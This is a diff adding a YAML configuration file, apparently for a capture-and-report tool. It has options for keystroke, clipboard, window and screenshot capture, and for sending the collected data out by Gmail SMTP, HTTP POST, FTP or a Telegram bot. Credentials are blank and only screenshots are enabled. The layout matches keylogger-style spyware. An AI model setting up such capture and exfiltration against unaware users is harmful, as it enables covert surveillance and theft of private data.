@@ -1,0 +1,67 @@
+general:
+  report_interval: 30
+  data_dir: "./data"
+  log_level: "INFO"
+  log_file: "./logs/app.log"
+
+capture:
+  keyboard:
+    enabled: false
+  mouse:
+    enabled: false
+  screenshot:
+    enabled: true
+    quality: 80
+    format: "png"
+    capture_region: "full"
+    max_count: 100
+  clipboard:
+    enabled: false
+    poll_interval: 5
+  window:
+    enabled: false
+    poll_interval: 2
+
+storage:
+  backend: "local"
+  max_size_mb: 500
+  rotation: true
+  sqlite_path: "./data/captures.db"
+
+transport:
+  method: "email"
+  retry_attempts: 3
+  retry_backoff: 2
+
+  email:
+    smtp_server: "smtp.gmail.com"
+    smtp_port: 465
+    use_ssl: true
+    sender: ""
+    password: ""
+    recipient: ""
+
+  http:
+    url: ""
+    method: "POST"
+    headers: {}
+
+  ftp:
+    host: ""
+    port: 21
+    username: ""
+    password: ""
+    remote_dir: "/uploads"
+
+  telegram:
+    bot_token: ""
+    chat_id: ""
+
+encryption:
+  enabled: false
+  algorithm: "AES-256-CBC"
+  key: ""
+
+compression:
+  enabled: true
+  format: "zip"
